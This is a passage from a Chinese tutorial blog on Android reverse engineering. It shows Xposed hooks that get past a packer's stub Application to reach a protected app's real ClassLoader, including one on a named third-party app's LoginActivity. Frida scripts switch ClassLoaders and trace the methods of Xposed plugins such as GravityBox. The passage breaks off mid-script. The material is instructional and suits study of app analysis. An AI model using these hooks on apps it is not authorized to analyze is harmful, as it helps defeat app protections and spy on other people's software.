</p><p>&emsp;举个例子，当我们静态分析加固app时发现，壳程序总是通过在应用进程中最先获得执行权限的application类中的attachBaseContext与onCreate函数完成对dex的释放与ClassLoader的切换，那么，我们可以hook 这两个函数来获得真实app的上下文。相关代码逻辑如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">XposedHelpers.findAndHookMethod(<span class="string">&quot;com.xxx.StubApp&quot;</span>, loadPackageParam.classloader, <span class="string">&quot;attachBaseContext&quot;</span>, Context.class, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 此时 param 指的应该是返回值</span></span><br><span class="line">        <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> (Context) param.args[<span class="number">0</span>];</span><br><span class="line">        <span class="comment">// 获取真实业务代码的 classLoader</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">finalClassLoader</span> <span class="operator">=</span> context.getClassLoader();</span><br><span class="line">        <span class="comment">// 之后 hook 真实 classLoader 的 method 即可</span></span><br><span class="line">        XposedHelpers.findAndHookMethod(clzz, finalClassLoader, <span class="string">&quot;method&quot;</span>, ..., <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>&emsp;上述方法有一个弊端，即一旦加固厂商改变相应继承Application类的类名，在此理解为方法名，即不一定为attachBaseContext函数，那么上述hook就失效了。那如何解决？</p><p>&emsp;再来补充知识：app被zygote孵化后，会通过<code>ActivityThread.main</code>启动相应app，在此函数中创建ActivityThread的实例，并进行初始化操作。ActivityThread类至关重要，它根据ActivityManager发送的请求对activities、broadcast Receviers等操作进行调度执行。<code>ActivityThread中的performLaunchActivity函数用于响应与activity相关的操作，ActivityThread中的mInitialApplication存放着当前的ClassLoader</code>。</p><p>&emsp;以movetv的MainActivity为例，实现hook的代码如下所示（代码放在函数handleLoadPackage中）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.app.Application;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">&quot;com.cz.babySister&quot;</span>))&#123;</span><br><span class="line">    XposedBridge.log(<span class="string">&quot;hooked &quot;</span> + loadPackageParam.processName);</span><br><span class="line">    <span class="comment">// hook ActivityThread 类</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">ActivityThread</span> <span class="operator">=</span> XposedHelpers.findClass(<span class="string">&quot;android.app.ActivityThread&quot;</span>, loadPackageParam.classLoader);</span><br><span class="line">    <span class="comment">// performLaunchActivity 用于响应与 activity 相关的操作</span></span><br><span class="line">    XposedBridge.hookAllMethods(ActivityThread, <span class="string">&quot;performLaunchActivity&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">            <span class="built_in">super</span>.afterHookedMethod(param);</span><br><span class="line">            <span class="comment">// 获取 ActivityThread 类中的 mInitialApplication 成员</span></span><br><span class="line">            <span class="type">Application</span> <span class="variable">mInitialApplication</span> <span class="operator">=</span> (Application) XposedHelpers.getObjectField(param.thisObject, <span class="string">&quot;mInitialApplication&quot;</span>);</span><br><span class="line">            <span class="type">ClassLoader</span> <span class="variable">finalLoader</span> <span class="operator">=</span> mInitialApplication.getClassLoader();</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;found classloader is =&gt; &quot;</span> + finalLoader.toString());</span><br><span class="line"></span><br><span class="line">            <span class="type">Class</span> <span class="variable">BabyLogin</span> <span class="operator">=</span> finalLoader.loadClass(<span class="string">&quot;com.cz.babySister.activity.LoginActivity&quot;</span>);</span><br><span class="line">            XposedBridge.log(<span class="string">&quot;Debug -&gt; &quot;</span> + BabyLogin.toString());</span><br><span class="line">            XposedBridge.hookAllMethods(BabyLogin, <span class="string">&quot;onCreate&quot;</span>, <span class="keyword">new</span> <span class="title class_">XC_MethodHook</span>()&#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable&#123;</span><br><span class="line">                    <span class="comment">// 当启动 MainActivity 时进行 Log</span></span><br><span class="line">                    <span class="built_in">super</span>.beforeHookedMethod(param);</span><br><span class="line">                    XposedBridge.log(<span class="string">&quot;LoginActivity onCreate called&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;结果如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231020201257929.png" alt="image-20231020201257929" style="zoom:67%;" /></p><h4 id="Frida-探-Xposed-Hook"><a href="#Frida-探-Xposed-Hook" class="headerlink" title="Frida 探 Xposed Hook"></a>Frida 探 Xposed Hook</h4><p>&emsp;本节利用frida，来学习Xposed是如何进行hook的。以<code>Xposed 安装&amp;Xposed插件（模块）</code>一节中的示例插件为例，使用objection注入目标进程，搜索com.roysue.xposed1.HookTest，命令行如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.roysue.xposed1 explore</span><br><span class="line">android hooking search classes HookTest</span><br></pre></td></tr></table></figure><p>&emsp;结果如下：</p><p><img src="/images/frida-reverse-analysis-2/image-20231020202510881.png" alt="image-20231020202510881" style="zoom:67%;" /></p><p>&emsp;但是，如果想要执行以下两条命令的任何一条时，就会报错，显示ClassNotFoundException：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 列出类中的函数</span><br><span class="line">android hooking list class_methods com.roysue.xposed1.HookTest</span><br><span class="line">android hooking list class_methods com.roysue.xposed1.HookTest$1</span><br><span class="line">// 钩取类中的所有函数</span><br><span class="line">android hooking watch class com.roysue.xposed1.HookTest</span><br><span class="line">android hooking watch class com.roysue.xposed1.HookTest$1</span><br></pre></td></tr></table></figure><p>&emsp;这里之所以报错，是因为：<code>ClassLoader不对，objection中并未结合frida中切换ClassLoader的功能，因此这部分需要自己写脚本完成。</code>如下traceXposed.js所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// traceXposed.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// enumerateClassLoaders 是 frida 的 api</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;com.roysue.xposed1.HookTest&quot;</span>))&#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found!&quot;</span>)</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(loader)</span><br><span class="line">                        <span class="comment">// 切换 classLoader</span></span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;, <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.roysue.xposed1 -l traceXposed.js --no-pause</span><br></pre></td></tr></table></figure><p>&emsp;输出此时含有com.roysue.xposed1.HookTest的ClassLoader，如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231020215345260.png" alt="image-20231020215345260" style="zoom:67%;" /></p><p>&emsp;完成切换后，对目标类进行hook发现不再报错，在下面的代码中，针对HookTest类中的PrintStack进行Hook，脚本如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// traceXposed.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// enumerateClassLoaders 是 frida 的 api</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">// hook PrintStack 函数</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.roysue.xposed1.HookTest&quot;</span>).<span class="property">PrintStack</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;hacked by wd&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook)</span><br></pre></td></tr></table></figure><p>&emsp;注入之后，点击应用的button，会调用PrintStack，此时会显示”hacked by wd”。作者发现，切换完ClassLoader之后，虽然能够获取com.roysue.xposed1.HookTest的类，但是对于Xposed提供的api，例如XposedBridge.log等，钩取时也会出现ClassNotFoundException错误，这说明：<code>使用Xposed实现的插件与Xposed自身的api不在一个ClassLoader所能加载的范围内</code>。</p><p>&emsp;我们先查看XposedBridge对应的ClassLoader叫啥？脚本如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// traceXposed.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// enumerateClassLoaders 是 frida 的 api</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;de.robv.android.xposed.XposedBridge&quot;</span>))&#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found!&quot;</span>)</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(loader)</span><br><span class="line">                        <span class="comment">// 切换 classLoader</span></span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;, <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hook)</span><br></pre></td></tr></table></figure><p>&emsp;结果如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231020215424099.png" alt="image-20231020215424099" style="zoom:67%;" /></p><p>&emsp;对比发现，Xposed插件在<code>/data/app/com.roysue.xposed1-1/base.apk</code>中，而Xposed的api在<code>/system/framework/XposedBridge.jar</code>中。结合代码，可以得出结论，Xposed插件实现了Xposed框架的IXposedHookLoadPackage接口，而XposedBridge则是调用XposedBridge.jar中的函数。</p><p>&emsp;再次分析上面xposed插件的代码，发现beforeHookedMethod与afterHookedMethod函数都在使用<code>new XC_MethodHook</code>构建的内部匿名类<code>HookTest$1</code>中，因此需要将ClassLoader切换为<code>HookTest$1</code>所在的loader。针对上面xposed插件，对beforeHookedMethod与afterHookedMethod进行hook，脚本如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hook.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">traceMethod</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">loader</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 切换为 com.roysue.xposed1.HookTest$1 类的 loader</span></span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;com.roysue.xposed1.HookTest$1&quot;</span>))&#123;</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;found!&quot;</span>)</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(loader)</span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;, <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)  </span><br><span class="line">        <span class="keyword">var</span> targetClassMethod = <span class="string">&quot;com.roysue.xposed1.HookTest$1.beforeHookedMethod&quot;</span></span><br><span class="line">        <span class="keyword">var</span> delim = targetClassMethod.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> targetClass = targetClassMethod.<span class="title function_">slice</span>(<span class="number">0</span>, delim)</span><br><span class="line">        <span class="keyword">var</span> targetMethod = targetClassMethod.<span class="title function_">slice</span>(delim + <span class="number">1</span>, targetClassMethod.<span class="property">length</span>)   </span><br><span class="line">        <span class="keyword">var</span> hook = <span class="title class_">Java</span>.<span class="title function_">use</span>(targetClass)</span><br><span class="line">        <span class="comment">// targetMethod 的重载数量</span></span><br><span class="line">        <span class="keyword">var</span> overloadCount = hook[targetMethod].<span class="property">overloads</span>.<span class="property">length</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Tracing &quot;</span> + targetClassMethod + <span class="string">&quot; [&quot;</span> + overloadCount + <span class="string">&quot; overload(s)]&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; overloadCount; i++) &#123;</span><br><span class="line">            hook[targetMethod].<span class="property">overloads</span>[i].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">warn</span>(<span class="string">&quot;\n*** entered &quot;</span> + targetClassMethod)</span><br><span class="line">                <span class="comment">// 打印参数 arguments</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; j++) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arg[&quot;</span> + j + <span class="string">&quot;]: &quot;</span> + <span class="variable language_">arguments</span>[j])</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 打印返回值 retval</span></span><br><span class="line">                <span class="keyword">var</span> retval = <span class="variable language_">this</span>[targetMethod].<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval: &quot;</span> + retval)</span><br><span class="line">                <span class="keyword">return</span> retval</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">    &#125;)    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;之后点击button，显示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231021164742074.png" alt="image-20231021164742074" style="zoom:67%;" /></p><p>&emsp;同理，钩取afterHookedMethod，显示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231021164848886.png" alt="image-20231021164848886" style="zoom:67%;" /></p><p>&emsp;接下来，以GravityBox为例，来描述如何对beforeHookedMethod与afterHookedMethod进行hook。</p><p>（1）GravityBox.apk下载<a href="https://www.modapkdown.com/com.ceco.nougat.gravitybox/download-by-happymod.html">链接</a>，下载并安装此插件。</p><p>（2）以修改状态栏颜色的类com.ceco.nougat.gravitybox.ModStatusbarColor为例，找其相关的匿名类（不使用之前的objection方法）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hook.js</span></span><br><span class="line"><span class="comment">// 寻找思想：默认存在 ModStatusbarColor$1 匿名类，获取相应的 loader，ModStatusbarColor$1 的其它匿名类也应该使用此 loader。因此，找寻此 loader 加载的所有 gravitybox 匿名类，且匿名类应该继承于 XC_MethodHook，匿名类中应该有 ModStatusbarColor 字符串。</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">lookClass</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">// 查找所有的类，以它们为 loader，从而查找 ModStatusbarColor$1 匿名类，并将其作为 loader</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateClassLoaders</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span> (<span class="params">loader</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span>(loader.<span class="title function_">findClass</span>(<span class="string">&quot;com.ceco.nougat.gravitybox.ModStatusbarColor$1&quot;</span>))&#123;</span><br><span class="line">                        <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = loader ;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="comment">// ModStatusbarColor$1 相应的 loader 可能会加载其他的匿名类</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="property">enumerateLoadedClasses</span> (&#123;</span><br><span class="line">            <span class="attr">onMatch</span>:<span class="keyword">function</span>(<span class="params">className</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 找到 gravitybox 的所有匿名类</span></span><br><span class="line">                    <span class="keyword">if</span>(className.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;gravitybox&quot;</span>) &gt; <span class="number">0</span> &amp;&amp; className.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(<span class="string">&quot;$&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                        <span class="comment">// 获得匿名类的父类，应该是 XC_MethodHook 才对，这种匿名类有 beforeHookedMethod 与 afterHookedMethod 函数</span></span><br><span class="line">                        <span class="keyword">if</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(className).<span class="property">class</span>.<span class="title function_">getSuperclass</span>())&#123;</span><br><span class="line">                            <span class="keyword">var</span> superClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(className).<span class="property">class</span>.<span class="title function_">getSuperclass</span>().<span class="title function_">getName</span>()</span><br><span class="line">                            <span class="keyword">if</span> (superClass.<span class="title function_">indexOf</span>(<span class="string">&quot;XC_MethodHook&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                                <span class="variable language_">console</span>.<span class="title function_">log</span>(className)</span><br><span class="line">                                <span class="comment">// traceClass(className)</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;     </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span>(error)&#123;&#125;</span><br><span class="line">            &#125;, <span class="attr">onComplete</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;search completed!&quot;</span>)     </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)  </span><br><span class="line">    &#125;)    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;这种寻找方法一个ModStatusbarColor匿名类也没找到，显然是错误的。这是为什么呢？<code>这是因为，由于Frida是进程级别的，而xposed在将代码对进程进行注入时做了进程的判断，例如xposed的ModStatusbarColor类是要对com.android.systemui进行注入，从而改变颜色。因此，只有判断进程是com.android.systemui时，才会初始化ModStatusbarColor类。但是，Frida脚本注入到了插件xposed1中，名字不为com.android.systemui，因此com.android.systemui类并未被初始化，也就找不到其匿名类。</code>原理如下图所示（Xposed开机时会钩取所有进程，此时给systemui注入了ModStatusbarColor）：</p><p><img src="/images/frida-reverse-analysis-2/image-20231021180801457.png" alt="image-20231021180801457" style="zoom:67%;" /></p><p>&emsp;那么，之后我们对systemui进程进行frida注入（hook.js代码无需修改），并进行搜索：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U com.android.systemui -l hook.js --no-pause</span><br></pre></td></tr></table></figure><p>&emsp;结果如下所示：</p><p><img src="/images/frida-reverse-analysis-2/image-20231021181737662.png" alt="image-20231021181737662" style="zoom:67%;" /></p><p>&emsp;之后，对上述寻找到的目标类中所有的函数进行hook，即实现上述代码中注释掉的traceClass函数，如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">traceMethod</span>(<span class="params">targetClassMethod</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> delim = targetClassMethod.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> targetClass = targetClassMethod.<span class="title function_">slice</span>(<span class="number">0</span>, delim)</span><br><span class="line">    <span class="keyword">var</span> targetMethod = targetClassMethod.<span class="title function_">slice</span>(delim + <span class="number">1</span>, targetClassMethod.<span class="property">length</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> hook = <span class="title class_">Java</span>.<span class="title function_">use</span>(targetClass);</span><br><span class="line">    <span class="keyword">var</span> overloadCount = hook[targetMethod].<span class="property">overloads</span>.<span class="property">length</span></span><br><span class="line"><span class="comment">// hook 类中的所有函数的所有重载</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; 